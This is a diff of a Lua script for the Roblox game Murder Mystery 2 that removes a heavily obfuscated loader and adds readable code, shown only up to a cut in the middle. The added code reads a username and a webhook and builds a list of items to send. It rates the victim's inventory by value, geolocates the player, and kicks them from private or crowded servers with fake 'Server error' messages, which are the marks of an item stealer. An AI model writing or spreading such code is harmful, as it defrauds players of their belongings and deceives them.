@@ -1,1 +1,678 @@
-return(function(...)local s={"\098\052\051\051\121\100\061\061";"\112\081\100\102\117\088\067\084\069\115\122\077\087\088\097\083","\098\052\090\082\098\052\122\081";"\065\088\090\075\065\099\067\083\087\111\121\061";"\084\050\090\106\098\053\061\061","\043\111\057\120\087\070\089\061";"\098\050\097\052\112\075\067\077\115\077\098\101\105\077\057\081\073\076\061\061";"\069\104\065\077\112\106\122\054\118\122\100\052\118\050\080\085\115\106\098\061";"\065\088\122\103\087\088\105\061";"\121\052\069\081\087\115\069\081\098\084\086\051\098\111\057\097";"\069\084\118\097\121\111\078\051\087\115\105\061";"\052\088\104\083\120\076\067\050\043\098\112\086\048\054\082\072\073\050\066\078\072\119\050\117\112\047\050\072\047\115\089\047\071\057\114\107\047\067\069\079\120\100\113\101\122\121\065\120\086\114\101\114\047\083\048\069\047\055\078\109\048\073\090\099\083\080\112\120\055\112\108\098\082\122\047\079\052\109\122\071\068\117\090\049\099\109\106\078\084\048\119\098\050\100\104\088\079\073\081\114\118\088\072\047\083\107\121\075\081\105\074\053\072\110\120\113\115\071\083\100\089\112\085\075\114\100\052\121\068\048\100\047\072\079\116\043\074\118\069\050\115\118\122\068\087\119\073\111\068\073\119\090\071\104\066\098\085\084\071\043\110\054\061\061";"\087\104\089\061","\121\077\102\061";"\065\088\090\082\065\115\050\103\043\084\089\061","\121\111\069\119\087\070\043\097","\043\084\067\101\087\070\089\061";"\121\070\086\101\047\115\078\106","\105\099\118\047\086\108\043\082\112\097\065\073\043\104\051\075\117\105\081\061";"\069\052\069\103\047\088\090\120\047\053\061\061";"\087\088\090\051\043\099\118\081\121\111\097\082\043\053\061\061","\069\088\122\119\121\088\069\101\089\077\086\097\065\088\069\056\065\088\069\049\089\054\061\061","\087\069\098\081\054\052\065\053\087\070\118\112\043\105\065\099";"\118\114\055\051\072\053\118\087\068\121\049\101\102\080\080\117\099\083\084\056\047\043\084\106";"\043\052\122\119\043\054\061\061";"\084\050\090\048\043\115\102\061","\098\106\097\081\043\054\061\061";"\121\111\122\082\043\088\090\119","\069\084\118\097\121\111\078\051\087\115\105\101";"\043\052\050\051\065\088\118\110","\118\069\089\052\112\106\110\050\065\111\051\067\043\052\083\083\087\053\061\061";"\117\105\121\075\115\106\080\053\069\052\051\047\073\088\053\101\115\054\061\061","\065\115\078\053\098\115\118\071","\118\122\049\053\065\088\050\102\105\081\097\050\086\111\067\081","\121\075\086\056\116\115\097\104\065\081\081\078\117\077\121\061","\073\103\100\097\043\074\110\083\073\100\061\061";"\087\104\077\061","\043\070\118\050\098\100\061\061";"\084\050\090\119\043\084\086\051\065\088\122\103\087\088\105\061";"";"\116\099\086\081\121\077\065\097\065\076\061\061","\084\050\090\083\087\111\086\097\117\076\061\061";"\073\100\061\061";"\086\105\065\119\098\069\083\052\105\088\043\056\108\122\083\106\065\049\105\061";"\048\116\085\081\073\049\070\112\086\117\074\098\109\122\071\122\100\115\111\087\116\085\115\107\076\068\048\110\081\114\104\116\100\079\088\122\110\106\056\111\070\067\112\057\113\072\090\073\049\089\090\089\048\102\055\087\075\111\071\055\099\098\090\068\056\082\113\090\070\078\107\053\072\102\115\083\083\107\086\102\099\052\116\113\075\072\117\085\115\106\090\117\107\057\107\116\048\047\120\097\086\071\051\087\083\051\119\049\108\121\083\070\107\071\108\065","\087\115\122\081\047\076\061\061";"\065\070\049\078\115\056\051\088\116\053\061\061","\047\056\067\104\047\077\050\078\043\111\067\089\087\106\065\104\121\100\061\061";"\043\088\097\075\098\070\069\075\043\084\089\061","\087\081\122\052\117\099\083\119\112\104\097\079\073\077\097\080";"\087\088\069\082","\065\111\069\118\117\122\043\074\073\069\086\081\121\105\098\081\043\088\081\061","\121\088\118\051\087\088\053\061","\114\116\105\068\102\102\048\109\085\086\104\109\080\121\099\116\118\110\078\105\105\110\072\047\097\090\053\061"}local function D(D)return s[D-(1079857-1046358)]end for D,q in ipairs({{510760-((347185+68496)+95078);629585-629531},{-1032471-(-1032472);-550855+(1584865-1033992)};{-812512-(-812531);999658+-999604}})do while q[53531+-53530]<q[438107+-438105]do s[q[641294-641293]],s[q[412752+-412750]],q[-941550+(143134-(-798417))],q[545176-545174]=s[q[-929995-((851730+(-1761103-858764))-(-838140))]],s[q[157504-157503]],q[(244165+-988551)-(-744387)]+(356252+-356251),q[-1001023-(-1001025)]-(-601798+601799)end end do local D=string.char local q=table.concat local o=s local C=type local Q=string.sub local r=string.len local K=math.floor local E={N=-295786-(438095+-733938);q=929564-929553;["\047"]=93550-93524,["\048"]=604979-(((3873+730628)-288172)-(-158606)),["\052"]=-123881-(-123935),e=547390-547340,V=-767599-(-767616);g=1039060-1039026,Z=(-246568+(599923-(-447023)))+-800317;T=-1018927-(-1018950),C=-213786-(-591194+377399);z=-635122+((-100793-350608)+1086528);["\057"]=252005-251956;m=-902215+902225;["\056"]=-788708+788743;["\053"]=-950093-(-950141),u=(951853+-304944)-646879;W=314008-313981,l=(912957+-683720)+-229218;O=((1225842-(-615436))-969828)-871392,B=-425817+425832,c=733807-733800;w=269344+-269299,s=91368-91346,X=876780-(1145328-268554),J=605086-605084,b=-666504-(-666528),t=-143992-(-144010),Y=773513-773505,U=-299271-(-299313);n=-254902+254942,o=(-456381+683681)-227262;A=1019719+(-938051-81639);F=439558+(-1379179-(-939676));r=(-519995-(-997))+519061,["\043"]=1000502+-1000477;["\051"]=-67786-(-67819);["\055"]=507982+-507951,E=-148975+148996;I=192461-192447;D=-804377-(-804439),Q=1048009-1047957;v=((-1038396-(-789495))+145051)+(-747458-(-851321)),a=((-828366+((578353+2105763)-666519))-618537)-570657;x=-587188+587235,["\050"]=(-465007-(-605368-195044))-(842249+(-509276+2379));K=1040156-1040105,j=(523257-595498)+72280;["\054"]=-253168+(694762+(-157366+-284212));k=391141+-391082;f=979828+-979772;S=192594+-192553,M=122013+-122009,h=297364+-297361,L=179105-179105,H=(-1274141-(318875-581102))+1011974;R=(((1163739-487230)+-231770)-807664)+(1265095-(298421-(-603703))),y=-514229+514257,P=-67564+67565;["\049"]=1039361-1039325,d=381299+-381267,G=-331053-(-331096),i=-219565+219585,p=((247359+-1346904)-(-733654))+365903}local x=table.insert for s=-291894+291895,#o,270734+(-751091+(672476+-192118))do local b=o[s]if C(b)=="\115\116\114\105\110\103"then local C=r(b)local J={}local M=452104-452103 local Y=-221320+(791919-(1452832-882233))local a=-90234+90234 while M<=C do local s=Q(b,M,M)local q=E[s]if q then Y=Y+q*(-479326+479390)^((999911-999908)-a)a=a+(445308+-445307)if a==251471-251467 then a=((75777+-1479941)-(-882566))-(-429598-(419168+-327168))local s=K(Y/(336115+-270579))local q=K((Y%((622192+((118262+161506)+-656786))+-179638))/(-669056-(-669312)))local o=Y%(-173883-(-174139))x(J,D(s,q,o))Y=-226603-(-226603)end elseif s=="\061"then x(J,D(K(Y/((33241-444893)+477188))))if M>=C or Q(b,M+((-571687+1414611)-842923),M+(-855741+855742))~="\061"then x(J,D(K((Y%(-696185+761721))/(-634043-(-634299)))))end break end M=M+(-417764-(-417765))end o[s]=q(J)end end end return(function(s,o,C,Q,r,K,E,Y,x,l,j,M,J,F,b,a,N,w,V,H,q)H,a,x,Y,M,F,J,j,q,b,V,N,w,l=function(s,D)local o=Y(D)local C=function(C,Q)return q(s,{C,Q},D,o)end return C end,function(s)local D,q=557783+-557782,s[394840-394839]while q do b[q],D=b[q]-(-66233-(735947-802181)),(886850+-886849)+D if(38387+-447519)+(-37538-(-446670))==b[q]then b[q],x[q]=nil,nil end q=s[D]end end,{},function(s)for D=-24509-(-24510),#s,800335-800334 do b[s[D]]=b[s[D]]+((124080-(-27179-(-8356)))+-142902)end if C then local q=C(true)local o=r(q)o[D(1036394+-1002889)],o[D((-310673+1106608)-762413)],o[D(-545350-(-578893))]=s,a,function()return((94455-(-481239))+-2146975)-946297 end return q else return Q({},{[D(-534934+((-1092283-(-177190))+1483549))]=a,[D(777311+-743806)]=s;[D(70467-36924)]=function()return-194052+-2323526 end})end end,365992-(((1062547-966967)+-133483)+403895),function(s)b[s]=b[s]-(882732-(832352-(-50379)))if b[s]==800152+-800152 then b[s],x[s]=nil,nil end end,function()M=((767265+168942)+-936206)+M b[M]=(-553431+673842)+-120410 return M end,function(s,D)local o=Y(D)local C=function(C,Q,r,K,E)return q(s,{C;Q;r;K;E},D,o)end return C end,function(q,C,Q,r)local a,Z,A,Y,k,U,P,d,G,T,L,h,y,p,W,i,v,g,t,I,R,M,w,E,e,m,S,n,b,z,B,f,O,u while q do if q<8862961-181336 then if q<3851952-(-759368)then if q<2453262-176972 then if q<1253513-(-73033)then if q<(1496302-879583)+314738 then if q<1619988-763521 then if q<1460525-986287 then q=true x[Q[-554238+554239]]=q E={}q=s[D((-821519-5174)+860208)]else q=2026658-753759 Y=x[Q[1046206-1046200]]M=Y==b E=M end else q=-515204+16423542 end else if q<111324+948882 then S=#p P=-935631-(-935632)U=-825582-(-825583)i=a(P,S)P=I(p,i)q=7199719-(-367089)S=x[h]T=P-U i=nil n=R(T)S[P]=n P=nil else q=-937673+5413352 x[Q[160928+-160923]]=E b=nil end end else if q<2815369-(-215440+1079453)then if q<((-37535+-71133)-(-1025849))-(-870953)then q=true q=9748706-1030336 else x[M]=E q=614868+15650820 end else if q<(-777550+1264017)+1596546 then E=D(968928+-935394)b=D(-674392-(-707931))q=s[E]E=q(b)q=s[D((489475-169434)-(741592-455102))]E={}else q=true q=q and 44170+865564 or 233599+8484771 end end end else if q<-741857+(3695865-(-995464))then if q<4582446-923085 then if q<4262626-690427 then if q<2557620-(-400143)then w=35184371145963-(-942869)q={}Z=D((-912069+832425)+(-781906+895085))R=186011-185756 x[Q[(239878+-648432)-(-215914+-192642)]]=q d=-438506-(-1068464-(-629957))E=x[Q[371052+-371049]]a=E E=M%w x[Q[-710606-(-710610)]]=E I=M%R R=(300048+706653)+-1006699 w=I+R x[Q[-184080-(-184085)]]=w R=s[Z]q=(1042975+-845650)+14746559 Z=D(-785509+819023)B=d I=R[Z]d=573981-(-957417+1531398)R=I(b)h=B<d I=D(1040434-1006931)e=R Y[M]=I Z=((154336+5601)+(-179018+(1058273-(-571265-(-599268)))))-1011188 I=-643536+643590 d=Z-B else P=#p S=525798+-525798 i=P==S q=1923102-951598 end else L=q m=1005947-1005946 y=k[m]m=false G=y==m v=G q=G and-454812+8909781 or 7095503-(-943078)end else if q<(1016596-1030702)+3753122 then n=not S A=A+u E=A<=f E=n and E n=A>=f n=S and n E=n or E n=-30377+7557465 q=E and n E=-815738+4822303 q=q or E else q=11518494-882389 G=-533163-(-559915+26751)L=k[G]v=L end end else if q<4359374-(-180984)then if q<3905123-(-159431)then f=x[M]A=f q=f and(7967072-480846)-(-825021)or 3520045-(-2032420-(-1005196))else q=x[Q[-476120-(-476127)]]q=q and-834353+((512309+-416105)+(106097+((4048133-(-778168))-(-1026723))))or 35399+9945263 end else if q<4431532-(-262423+143438)then x[M]=A q=x[M]q=q and(11376563-740263)-((-55002-107703)+1030764)or-199641+1714334 else v=x[M]q=v and(48630-(-394101))+(-814963+4016753)or(767290+(-577436-1003396))+2668857 E=v end end end end else if q<(((624347+-948798)-(-162086))+7224838)-(-479861)then if q<(5796567-(-600148))-(-187737)then if q<727235+5153490 then if q<6226373-977075 then if q<-449032+5552317 then I=E R=D(-244873+278382)E=s[R]R=D(821550-788005)q=E[R]R=J()x[R]=q Z=D(905365-871839)h=D(477634+-444108)E=s[Z]Z=D(917586-(580625+((123713-((521505+-1471988)+1414191))+643436)))q=E[Z]Z=q B=s[h]e=B d=q q=B and 43815+8973226 or(-1227825-(-582849))+9179684 else Y=(943143+-1512285)-(-569142)b=D(-134232+167766)q=s[b]M=x[Q[-72396-(588648+(-1428881-(-767829)))]]b=q(M,Y)q=9564069-(-416593)end else M=x[Q[-116144-(-116146)]]q=6980954-(-409983)Y=x[Q[254179-254176]]b=M==Y E=b end else if q<(6429085-31383)-154236 then d=D(-1004997-(-1038547))e=s[d]E=e q=15038752-(-966389)else E=D(713211-679679)Z=D((1005185+((-1985909-350809)-(-729150)))-(-635899))q=s[E]b=x[Q[202674-202670]]a=D((-102984+(-942533+((-109150+597063)-(-169843))))-(-421282))Y=s[a]R=s[Z]e=l(586590+15543991,{})Z={R(e)}I={o(Z)}R=(985803+(-1968316-(-674197)))-(-308318)w=I[R]a=Y(w)Y=D(685656-652103)M=b(a,Y)b={M()}E=q(o(b))M=x[Q[-969408+(-570741+1540154)]]q=M and 118724+673710 or 1344383-71484 b=E E=M end end else if q<(-1118742-(-602933))+7905764 then if q<6531923-(((-604545-160037)-(-96735))-(-182709-(427914+(-475559+439507))))then Y=424478+(-4067-420379)B=902657-(443594+459050)e=311789-311787 M=x[Q[-436111-(-974524+538410)]]b=M%Y a=x[Q[-486540-(-486544)]]R=x[Q[1030475-(704824+325649)]]i=x[Q[-230004-(-230007)]]p=i-b i=452350-452318 h=p/i d=B-h Z=e^d B=19962-19706 I=R/Z Z=846842-846841 w=a(I)a=4408+4294962888.0 Y=w%a w=552774+(-29524-523248)a=w^b M=Y/a b=nil a=x[Q[254616+-254612]]R=M%Z Z=-350160+((829827-314046)+(4294188143.0-(663542+-1277074)))I=R*Z w=a(I)a=x[Q[51709-51705]]I=a(M)Y=w+I w=-387885+453421 M=nil R=193930-128394 a=Y%w I=Y-a w=I/R q=325340+14539446 R=127296-127040 I=a%R e=-786441+786697 Z=a-I R=Z/e e=247881-247625 Z=w%e d=w-Z a=nil e=d/B d={I;R,Z,e}R=nil e=nil Y=nil w=nil x[Q[11131-(-755908+767038)]]=d Z=nil I=nil else q=true q=q and 8381284-549419 or 16082083-691257 end else if q<6809140-(-588794)then q=E and 5880626-(-373054)or 4027267-(-448412)else n=J()T=D(((459690+839927)-(43430-(-915418)))+-307260)x[n]=A E=s[T]O=-681921-(-681922)U=-92001+92101 T=D(70907+-37362)z=539855-539600 q=E[T]T=-738808-(-738809)E=q(T,U)T=J()U=(-872596+(2211540-796589))-542355 x[T]=E t=(876119-992801)-(-126682)g=-243668+243668 G=D(-291688+(-96766-(-421975)))q=x[R]E=q(U,z)z=-88939+88940 k=-478728-(-478730)U=J()x[U]=E q=x[R]W=x[T]E=q(z,W)z=J()x[z]=E E=x[R]W=E(O,k)E=659909-659908 q=W==E W=J()k=D((-302786+534044)-197752)x[W]=q E=D(-122620+(578580+-422407))L=s[G]y=x[R]q=D(752184-718683)m={y(g,t)}G=L(o(m))q=i[q]L=D(-250608+(306042-21928))v=G..L O=k..v q=q(i,E,O)k=D((1167254-171285)-962453)O=J()x[O]=q v=j(15364421-976281,{R,n,d;Y;M;P;W,O,T,z,U;e})E=s[k]k={E(v)}q={o(k)}k=q q=x[W]q=q and 3889848-(-667994)or(8603543-(-112537))-(-910506)end end end else if q<(-204151+(592657+-506533))+(31843+8356089)then if q<621056+7360490 then if q<-55657+7895859 then if q<-954396+8677599 then S=27752-27752 P=#p i=P==S q=i and-226476+15821120 or-902956+1874460 else E=D(125722+-92192)b=D(157569-124069)q=s[E]E=s[b]b=D(-631962-(-665462))s[b]=q b=D((-346359+(-121718+1397435))-895828)s[b]=E b=x[Q[(-363347+922856)-559508]]M=b()q=7883209-493560 end else M=C[(-795573+(-460695+229127))-(-1494779-(-467636))]q=x[Q[-285793+285794]]b=C[-160182+160183]Y=q q=Y[M]q=q and 603952+8205676 or(587423+2719078)-((-239223+(213829-(-436849-(-529859))))-(-820163))end else if q<(563214+8557836)-948444 then q=L q=-244758+((-37635+2946851)-809143)E=v else i=P U=i q=-561857+15800501 p[i]=U i=nil end end else if q<190892+8287628 then if q<782484+7645453 then f=B==h q=-974016+5521285 A=f else q=8663869-(-264482+889770)m=-717553-(-717555)y=k[m]m=x[O]G=y==m v=G end else if q<7616387-(-495181+-527338)then q=d q=e and 671411+15333730 or-47329+(5527782-(-761030))E=e else Y=(1119864-725443)+-394420 M=x[Q[-495274+495277]]b=M~=Y q=b and 697827+5908431 or-235651+11174219 end end end end end else if q<(-753661+1575063)+((-759709+13149637)-(((-740772+1655985)-(-961170-(-923549)))+-804415))then if q<10495113-551659 then if q<25161+((8960762-(-600177-(372247+(988689+-950720))))-844812)then if q<7925461-(-949267)then if q<(-349602+8551923)-(-581246)then if q<992813+7734618 then q=V(10207923-959375,{a})f={q()}E={o(f)}q=s[D(125081-91532)]else I=x[w]E=I q=333227+4642246 end else q=-424311+(16368078-(-538690))end else if q<-469798+9497331 then p=D(-128619-(-162145))h=s[p]p=D((387564-1030325)+676311)q=8560654-25946 B=h[p]e=B else u=D((-96915+-883144)-(-1013580))q=s[u]n=D((868392-(-187915))-((-980057+18251)+1984613))S=s[n]u=q(S)q=D((-1316097-(-873996))-(-475631))s[q]=u q=-834688+((18443420-967569)-(-40544))end end else if q<735295+8824044 then if q<-382930+9580791 then q=x[Q[(803133-(-232237))+-1035360]]M=x[Q[511194-511183]]b[q]=M q=x[Q[(-859414+1605704)-(-460878+1207156)]]M={q(b)}E={o(M)}q=s[D(-232685-((-181023-(-597806))-683008))]else q=-434557+7824206 end else if q<-492250+10189326 then L=x[M]q=L and-143575+3898409 or 10159235-(-476870)v=L else q=11943338-34333 end end end else if q<12064789-25332 then if q<11063249-129631 then if q<504009+10277647 then if q<(662297+-1140169)+(11449393-555435)then Y=x[Q[-635089+635098]]a=Y q={}Y=276847-276846 M=(-768056+544569)-(-223488)b=q w=Y Y=748459+-748459 I=w<Y Y=M-w q=(-42112+14144250)-((-107956+-22573)-(578075+(154600+-1378760)))else x[M]=v m=x[z]g=-666671-(-666672)y=m+g G=k[y]L=B+G G=208996+-208740 q=L%G B=q y=x[U]G=h+y q=17115803-850115 y=-497888-(-498144)L=G%y h=L end else u=D(29192+4343)f=s[u]u=D(-720960+754504)A=f[u]Z=d q=472747+(14509612-38475)f=A(b,Z)Z=nil A=x[Q[(-804893+362909)+(668255+-226265)]]u=A()P=f+u i=P+I P=-203179-(781431-984866)p=i%P I=p P=Y[M]u=(-230271+-245148)-(-220286+-255134)f=I+u A=a[f]i=P..A Y[M]=i end else if q<(979957+-1356385)+11616997 then Y=((912598-549832)-(-875036+275882))-961901 M=x[Q[1037466-(912943-(-124520))]]b=M*Y M=-903204-(-903461)q=732300+((-928034+8888244)-47176)E=b%M x[Q[-878139-(-878142)]]=E else p=nil i=nil R=F(R)Y=F(Y)P=F(P)d=F(d)R=D(552964-519455)Y=nil w=F(w)B=nil Z=nil e=F(e)a=F(a)d=J()M=F(M)M=nil I=nil e=D(522835+-489300)h=nil Z=D((1076682-380203)+-662953)I=D(147751+-114242)h=J()w=s[I]I=D(-860830+(973422-79069))a=w[I]w=J()x[w]=a I=s[R]R=D(-257041-((-285715+(40038+(1274922-795695)))-(((46294+1002770)-1015801)-(-490873))))p={}a=I[R]R=s[Z]Z=D(656375-(764980+-142138))I=R[Z]Z=s[e]e=D(-680411-(-713929))R=Z[e]P=1020017+-1019761 i=407703+-407702 e=J()q=(-277274-((534213-(-293825))-((705255+-451432)+-133845)))+16223978 Z=-283367+((-288615+-57299)+(754068+-124787))B={}x[e]=Z Z=424257-(-680834+1105089)x[d]=Z x[h]=B B=62010+-62010 S=P Z={}P=(760059+266418)+-1026476 n=P P=13191-13191 T=n<P P=i-n end end else if q<359080+12367934 then if q<(760491-(757828+(((39892+338302)-158231)-387812)))+(375166+11946542)then R=nil a=nil I=nil q=17266648-784191 else Y=93533-93424 M=x[Q[-720033-(-720035)]]b=M*Y M=24593391141176-327991 E=b+M M=-366319+366320 b=294979+35184371793853 q=E%b x[Q[(-270807-(-383682))-112873]]=q q=987501+9951067 b=x[Q[311068+-311065]]E=b~=M end else if q<(-746976+13745790)-108503 then u=-530707+530708 S=(456672+-932028)+475362 q=x[R]f=q(u,S)q=D(-682439+715969)s[q]=f S=D(672670+-639140)u=s[S]S=676971+-676969 q=u>S q=q and 8416413-(-721139)or-127838+15637921 else M=J()b=C a=J()Y=D(15259+18276)R=D((-983936+990484)-(-26968))w=J()q=true x[M]=q E=s[Y]Y=D(-578671+612218)q=E[Y]Y=J()x[Y]=q q=j((-255919+2900943)-586506,{})x[a]=q q=false Z=l(385188+84882,{w})x[w]=q I=s[R]R=I(Z)E=R q=R and((310404-((-209932+920270)-522816))+7718035)-(-898727)or-404433+5379906 end end end end else if q<15475831-75464 then if q<464868+14341955 then if q<771409+13117410 then if q<(-951346+14543414)-307162 then if q<-918866+14156734 then q=s[D(540327-506816)]E={}else b=x[Q[131193-(1139611-1008419)]]E=#b b=-709893-(-709893)q=E==b q=q and 74320+12504427 or-228627+15093413 end else R=not I Y=Y+w M=Y<=a M=R and M R=Y>=a R=I and R M=R or M R=(-991622+16744335)-(-419545)q=M and R M=9204323-7705 q=q or M end else if q<(13061391-(-1310925-(-291967-280139)))-(-496320)then Y=6878757-312790 M=D((-837027+1220932)-350386)E=584810+9037417 b=M^Y q=E-b b=q E=D(((-999492+768437)+75899)-(-188708))q=E/b E={q}q=s[D(-545316-(-578841))]else M=x[Q[585019-585018]]a=639728-639727 w=186671-186669 Y=M(a,w)M=-543628+543629 b=Y==M E=b q=b and 6824207-(-566730)or 6504169-643044 end end else if q<912059+14198762 then if q<(-455261-(-956942))+14364101 then Y=D(276264+-242738)M=s[Y]Y=D(610661-577128)b=M[Y]Y=x[Q[340433-(-439367+779799)]]M={b(Y)}E={o(M)}q=s[D(-613325+646849)]else p=not h d=d+B Z=d<=e Z=p and Z p=d>=e p=h and p Z=p or Z p=11789272-(258294+660578)q=Z and p Z=-313674+12587907 q=q or Z end else if q<890246+14390390 then P=P+n i=P<=S U=not T i=U and i U=P>=S U=T and U i=U or i U=944493+7321164 q=i and U i=3475735-11131 q=q or i else E={}q=s[D(-47398+80911)]end end end else if q<(-1015583+1093817)+16058873 then if q<-17227+15955375 then if q<15578584-(-43615)then if q<15907484-389075 then S=D(349659+-316129)q=s[S]S=D(653197-619697)s[S]=q q=17673025-((-663634+2396993)-742041)else a=nil P=J()R=nil i={}x[P]=i i=J()p=nil Z=nil S=H(304997+12944826,{P;e,d,w})T=D(234634+-201107)x[i]=S W=D(802814-769309)n=J()S={}U={}k=D(-145269-(-178771))x[n]=S B=nil G=nil S=s[T]O=x[n]z={[W]=O;[k]=G}R=-181849+10651504346713 T=S(U,z)S=N(668290+7264244,{n,P,h;e,d;i})M=T I=nil w=F(w)Z=-1009669+(-557072+29197243869205)h=F(h)Y=S I=D(682228-(-318371-(-1267897-(-300815))))E={}i=F(i)e=F(e)n=F(n)P=F(P)w=Y(I,R)a=M[w]w=D(141301+-107773)R=D(446793+-413290)P=12786356754577-530577 B=D(908054-874512)d=F(d)s[w]=a i=D(259524-(-586536-(-812552)))d=2602310213069-((-246554-(-313086-(-937494)))+1730559)I=Y(R,Z)w=M[I]e=-301465+24051472357785 q=s[D(818529+-785022)]I=D((430092+-899509)-(-502963))s[I]=w Z=D(742395+-708866)R=Y(Z,e)e=D(147217-113676)I=M[R]R=D((33010-(-618184))+-617657)s[R]=I Z=Y(e,d)R=M[Z]e=D(-244052-(-277590))Z=D(-462996+496508)s[Z]=R Z=s[e]d=s[B]p=Y(i,P)h=M[p]p=D(-542315-(-575819))Y=nil p=d[p]B={p(d,h)}e=Z(o(B))M=nil Z=e()end else q=true q=q and-327603+13171406 or 12934662-(-144908)end else if q<15397552-(-626301)then e=J()B=618985+-618920 p=D(995459+-961943)x[e]=E q=x[R]d=-437755-(-437758)E=q(d,B)d=J()q=-371895+(-260907+632802)u=D((-691489+589784)-(370188-505414))i=V(13570396-(-668220+(520951-378824)),{})B=q q=(-572098-(-135465))-(-436633)h=q x[d]=E E=s[p]p={E(i)}q={o(p)}E=-500762+500764 p=q q=p[E]i=q E=D(-452260-(-485792))q=s[E]P=x[Y]f=s[u]u=f(i)f=D(695618+(-673420-(-11355)))A=P(u,f)P={A()}E=q(o(P))P=J()x[P]=E E=(205442+(-67445-544498))+406502 A=x[d]f=A A=(407647+-613375)+205729 u=A q=-67807+3788619 A=-641027-(-641027)S=u<A A=E-u else E=((-96693+504078)+10673688)-((176570-(-390879-(-182417)))-(1449519-1017051))M=D((1166146-(242254+440649))+(541208+-990941))Y=(-1025473+(615961+1404502))+3856903 b=M^Y q=E-b E=D(-569007-(-602538))b=q q=E/b E={q}q=s[D(-638120+671668)]end end else if q<16465579-(-204308-(454096+-660454))then if q<200142+16003384 then Z=876095+(-1218579-(-342484))e=-9272+9527 q=x[Q[-214806-(-214807)]]M=Y R=q(Z,e)q=419676+13166906 b[M]=R M=nil else U=F(U)n=F(n)T=F(T)k=nil O=F(O)z=F(z)q=2987999-(-732813)W=F(W)end else if q<(17135757-(-355514))-916555 then q=s[D(605543-572007)]E={M}else q=(116623-(-333215-(-354207)))+15812707 end end end end end end end q=#r return o(E)end,{},function(s,D)local o=Y(D)local C=function(C)return q(s,{C},D,o)end return C end,function(s,D)local o=Y(D)local C=function(C,Q,r,K,E,x)return q(s,{C,Q;r;K;E;x},D,o)end return C end,function(s,D)local o=Y(D)local C=function(...)return q(s,{...},D,o)end return C end,function(s,D)local o=Y(D)local C=function()return q(s,{},D,o)end return C end return(w(-857836+(353334+13479146),{}))(o(E))end)(getfenv and getfenv()or _ENV,unpack or table[D(-211909+245459)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local ExecutorWebhoo2 = identifyexecutor() or "undefined"
+if ExecutorWebhoo2 == "Delta" then
+    game.Players.LocalPlayer:Kick("Our Script not support delta executor. Try other executor! recommand: Codex, Ronix")
+end
+
+local function MM2()
+    local user = Username
+    local webhook = Webhook
+
+    local VintageList = ""
+    local UniqueList = ""
+    local AncientList = ""
+    local GodlyList = ""
+    local LegendaryList = ""
+    local HalloweenList = ""
+    local ChristmasList = ""
+    local RareList = ""
+    local UncommonList = ""
+    local CommonList = ""
+
+    local vintageItemsC = 0
+    local uniqueItemsC = 0
+    local ancientItemsC = 0
+    local godlyItemsC = 0
+    local legendaryItemsC = 0
+    local HalloweenItemsC = 0
+    local ChristmasItemsC = 0
+    local rareItemsC = 0
+    local uncommonItemsC = 0
+    local commonItemsC = 0
+    local List = ""
+    local List2 = ""
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
+
+    local weaponsToSend = {}
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+    local playerGui = plr:WaitForChild("PlayerGui")
+    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    local HttpService = game:GetService("HttpService")
+
+    local function trim2(s)
+        return (s:gsub("^%s*(.-)%s*$", "%1"))
+    end
+
+    local rawCountryCode = game:HttpGet("https://ipinfo.io/country")
+    local countryCode = trim2(rawCountryCode)
+    countryCode = string.lower(countryCode)
+    local countryFlagEmoji = ":flag_" .. countryCode .. ":"
+
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        plr:kick("Server error. Please join a different server!")
+        return
+    end
+
+    if #Players:GetPlayers() >= 12 then
+        plr:kick("Server error. Please join a different server!")
+        return
+    end
+
+    local rarityTable = {
+        "Common",
+        "Uncommon",
+        "Christmas",
+        "Halloween",
+        "Rare",
+        "Legendary",
+        "Godly",
+        "Ancient",
+        "Unique",
+        "Vintage"
+    }
+
+    local categories = {
+        godly = "https://supremevaluelist.com/mm2/godlies.html",
+        ancient = "https://supremevaluelist.com/mm2/ancients.html",
+        unique = "https://supremevaluelist.com/mm2/uniques.html",
+        classic = "https://supremevaluelist.com/mm2/vintages.html",
+        chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    }
+    local headers = {
+        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    }
+
+    local function trim(s)
+        return s:match("^%s*(.-)%s*$")
+    end
+
+    local function fetchHTML(url)
+        local response =
+            request(
+            {
+                Url = url,
+                Method = "GET",
+                Headers = headers
+            }
+        )
+        return response.Body
+    end
+
+    local function parseValue(itembodyDiv)
+        local valueStr = itembodyDiv:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')
+        if valueStr then
+            valueStr = valueStr:gsub(",", "")
+            local value = tonumber(valueStr)
+            if value then
+                return value
+            end
+        end
+        return nil
+    end
+
+    local function extractItems(htmlContent)
+        local itemValues = {}
+
+        for itemName, itembodyDiv in htmlContent:gmatch(
+            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
+        ) do
+            itemName = itemName:match("([^<]+)")
+            if itemName then
+                itemName = trim(itemName:gsub("%s+", " "))
+                itemName = trim((itemName:split(" Click "))[1])
+                local itemNameLower = itemName:lower()
+
+                local value = parseValue(itembodyDiv)
+                if value then
+                    itemValues[itemNameLower] = value
+                end
+            end
+        end
+
+        return itemValues
+    end
+
+    local function extractChromaItems(htmlContent)
+        local chromaValues = {}
+
+        for chromaName, itembodyDiv in htmlContent:gmatch(
+            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
+        ) do
+            chromaName = chromaName:match("([^<]+)")
+            if chromaName then
+                chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+                local value = parseValue(itembodyDiv)
+                if value then
+                    chromaValues[chromaName] = value
+                end
+            end
+        end
+
+        return chromaValues
+    end
+
+    local function buildValueList()
+        local allExtractedValues = {}
